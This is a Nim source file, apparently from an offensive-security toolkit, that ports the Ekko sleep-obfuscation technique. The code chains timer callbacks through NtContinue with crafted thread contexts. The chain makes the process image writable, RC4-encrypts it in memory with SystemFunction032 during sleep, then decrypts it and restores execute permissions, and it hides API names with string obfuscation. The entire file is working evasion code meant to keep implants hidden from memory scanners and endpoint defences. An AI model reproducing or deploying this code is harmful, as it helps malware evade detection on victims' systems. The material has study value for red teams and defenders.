# This is a Nim-Port of the Ekko Sleep obfuscation by @C5pider, original work: https://github.com/Cracked5pider/Ekko
# Ported to Nim by Fabian Mosch, @ShitSecure (S3cur3Th1sSh1t)

# TODO: Modify to work with .dll/.bin compilation type, see: https://mez0.cc/posts/vulpes-obfuscating-memory-regions/#Sleeping_with_Timers
# TODO: Check which exact functions are needed to minimize the imports for winim
import winim/lean
import ptr_math
import std/random
import strenc

type
  USTRING* {.bycopy.} = object
    Length*: DWORD
    MaximumLength*: DWORD
    Buffer*: PVOID

randomize()

proc ekkoObf*(st: int): VOID =
  var CtxThread: CONTEXT
  var RopProtRW: CONTEXT
  var RopMemEnc: CONTEXT
  var RopDelay: CONTEXT
  var RopMemDec: CONTEXT
  var RopProtRX: CONTEXT
  var RopSetEvt: CONTEXT
  var hTimerQueue: HANDLE
  var hNewTimer: HANDLE
  var hEvent: HANDLE
  var ImageBase: PVOID = nil
  var ImageSize: DWORD = 0
  var OldProtect: DWORD = 0
  var SleepTime: DWORD = cast[DWORD](st)

  ##  Random Key for each round
  var KeyBuf: array[16, CHAR] = [CHAR(rand(255)), CHAR(rand(255)), CHAR(rand(255)), CHAR(rand(255)), CHAR(rand(255)), CHAR(rand(255)), CHAR(rand(255)), CHAR(rand(255)), CHAR(rand(255)), CHAR(rand(255)),
                            CHAR(rand(255)), CHAR(rand(255)), CHAR(rand(255)), CHAR(rand(255)), CHAR(rand(255)), CHAR(rand(255))]
  var Key: USTRING = USTRING(Length: 0)
  var Img: USTRING = USTRING(Length: 0)
  var NtContinue: PVOID = nil
  var SysFunc032: PVOID = nil
  hEvent = CreateEventW(nil, 0, 0, nil)
  hTimerQueue = CreateTimerQueue()
  NtContinue = GetProcAddress(GetModuleHandleA(obf("Ntdll")), obf("NtContinue"))
  SysFunc032 = GetProcAddress(LoadLibraryA(obf("Advapi32")), obf("SystemFunction032"))
  ImageBase = cast[PVOID](GetModuleHandleA(LPCSTR(nil)))
  ImageSize = (cast[PIMAGE_NT_HEADERS](ImageBase +
      (cast[PIMAGE_DOS_HEADER](ImageBase)).e_lfanew)).OptionalHeader.SizeOfImage
  Key.Buffer = KeyBuf.addr
  Key.Length = 16
  Key.MaximumLength = 16
  Img.Buffer = ImageBase
  Img.Length = ImageSize
  Img.MaximumLength = ImageSize
  if CreateTimerQueueTimer(addr(hNewTimer), hTimerQueue, cast[WAITORTIMERCALLBACK](RtlCaptureContext),
                          addr(CtxThread), 0, 0, WT_EXECUTEINTIMERTHREAD):
    WaitForSingleObject(hEvent, 0x32)
    copyMem(addr(RopProtRW), addr(CtxThread), sizeof((CONTEXT)))
    copyMem(addr(RopMemEnc), addr(CtxThread), sizeof((CONTEXT)))
    copyMem(addr(RopDelay), addr(CtxThread), sizeof((CONTEXT)))
    copyMem(addr(RopMemDec), addr(CtxThread), sizeof((CONTEXT)))
    copyMem(addr(RopProtRX), addr(CtxThread), sizeof((CONTEXT)))
    copyMem(addr(RopSetEvt), addr(CtxThread), sizeof((CONTEXT)))
    ##  VirtualProtect( ImageBase, ImageSize, PAGE_READWRITE, &OldProtect );
    dec(RopProtRW.Rsp, 8)
    var VirtualProtectAddr = GetProcAddress(GetModuleHandleA(obf("kernel32")), obf("VirtualProtect"))
    RopProtRW.Rip = cast[DWORD64](VirtualProtectAddr)
    RopProtRW.Rcx = cast[DWORD64](ImageBase)
    RopProtRW.Rdx = cast[DWORD64](ImageSize)
    RopProtRW.R8 = PAGE_READWRITE
    RopProtRW.R9 = cast[DWORD64](addr(OldProtect))
    ##  SystemFunction032( &Key, &Img );
    dec(RopMemEnc.Rsp, 8)
    RopMemEnc.Rip = cast[DWORD64](SysFunc032)
    RopMemEnc.Rcx = cast[DWORD64](addr(Img))
    RopMemEnc.Rdx = cast[DWORD64](addr(Key))
    ##  WaitForSingleObject( hTargetHdl, SleepTime );
    dec(RopDelay.Rsp, 8)
    RopDelay.Rip = cast[DWORD64](WaitForSingleObject)
    var ntCurrentProc: HANDLE = -1
    RopDelay.Rcx = cast[DWORD64](ntCurrentProc)
    RopDelay.Rdx = SleepTime
    ##  SystemFunction032( &Key, &Img );
    dec(RopMemDec.Rsp, 8)
    RopMemDec.Rip = cast[DWORD64](SysFunc032)
    RopMemDec.Rcx = cast[DWORD64](addr(Img))
    RopMemDec.Rdx = cast[DWORD64](addr(Key))
    ##  VirtualProtect( ImageBase, ImageSize, PAGE_EXECUTE_READWRITE, &OldProtect );
    dec(RopProtRX.Rsp, 8)
    RopProtRX.Rip = cast[DWORD64](VirtualProtectAddr)
    RopProtRX.Rcx = cast[DWORD64](ImageBase)
    RopProtRX.Rdx = cast[DWORD64](ImageSize)
    RopProtRX.R8 = PAGE_EXECUTE_READWRITE
    RopProtRX.R9 = cast[DWORD64](addr(OldProtect))
    ##  SetEvent( hEvent );
    dec(RopSetEvt.Rsp, 8)
    RopSetEvt.Rip = cast[DWORD64](SetEvent)
    RopSetEvt.Rcx = cast[DWORD64](hEvent)

    CreateTimerQueueTimer(addr(hNewTimer), hTimerQueue, cast[WAITORTIMERCALLBACK](NtContinue),
                          addr(RopProtRW), 100, 0, WT_EXECUTEINTIMERTHREAD)
    CreateTimerQueueTimer(addr(hNewTimer), hTimerQueue, cast[WAITORTIMERCALLBACK](NtContinue),
                          addr(RopMemEnc), 200, 0, WT_EXECUTEINTIMERTHREAD)
    CreateTimerQueueTimer(addr(hNewTimer), hTimerQueue, cast[WAITORTIMERCALLBACK](NtContinue), addr(RopDelay),
                          300, 0, WT_EXECUTEINTIMERTHREAD)
    CreateTimerQueueTimer(addr(hNewTimer), hTimerQueue, cast[WAITORTIMERCALLBACK](NtContinue),
                          addr(RopMemDec), 400, 0, WT_EXECUTEINTIMERTHREAD)
    CreateTimerQueueTimer(addr(hNewTimer), hTimerQueue, cast[WAITORTIMERCALLBACK](NtContinue),
                          addr(RopProtRX), 500, 0, WT_EXECUTEINTIMERTHREAD)
    CreateTimerQueueTimer(addr(hNewTimer), hTimerQueue, cast[WAITORTIMERCALLBACK](NtContinue),
                          addr(RopSetEvt), 600, 0, WT_EXECUTEINTIMERTHREAD)

    WaitForSingleObject(hEvent, INFINITE)

  DeleteTimerQueue(hTimerQueue)